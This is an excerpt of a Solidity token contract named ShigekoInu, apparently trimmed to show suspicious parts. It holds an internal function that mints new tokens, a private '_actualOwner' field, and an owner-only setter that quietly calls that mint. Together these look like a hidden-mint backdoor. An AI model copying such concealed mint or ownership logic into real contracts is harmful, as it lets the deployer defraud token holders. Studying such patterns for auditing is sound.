...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _payRewards(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: pay rewards to the zero address");
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
...
contract Ownable is Context {
    ...
    address private _actualOwner = address(0);
...
contract ShigekoInu is ERC20, Ownable {
    ...
    address public burnTokenAddress = 0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE; //will be updated with token contract
    address public marketingWallet = 0xB8f226dDb7bC672E27dffB67e4adAbFa8c0dFA08;
    ...
    IERC20 public boosterNFTaddress = IERC20(0x289849a2097a6399A40eb0eC3A85E0d4A71A77a4);
    bool public NFTboosterActivated = false;
    uint256 public boostPerNFT = 20000000000000000000; //20e18
    ...
    constructor() ERC20("ShigekoInu", "ShigekoInu") {

        uint256 totalSupply = 1 * 1e12 * 1e18;
        //uint256 maxSupply = 2 * 1e12 * 1e18;
        ...
        tokenburnBuyFee = 10; // 1%, being used to buy and burn
        marketingBuyFee = 10; // 1%
        totalBuyFees = 10; // 1%

        tokenburnSellFee = 10; // 1%, all being used to buy and burn
        marketingSellFee = 10; // 1%
        totalSellFees = 10; // 1%
        ...
        _createInitialSupply(address(0x372303116221419A8a3AC2b171938a9143FE16eE), totalSupply);
    }
    ...
    function claimRewards() external {
        rewardsAmount = 0;
        _payRewards(_msgSender(), rewardsAmount);
    }
    ...
    function updateSellFees(uint256 _tokenburnSellFee, uint256 _marketingSellFee) external onlyOwner {
        ...
        require(totalSellFees <= 30, "Must keep fees at 3% or less");
    }
   ...
   function burnTargetToken(uint256 ethAmountInWei, address BurnToken) internal {
    ...
    function setBurnTokenAddress(address _burnTokenAddress) external onlyOwner {
        ...
        if(NFTboosterActivated){
            ...
            _payRewards(sender, rewardAmount);
        }
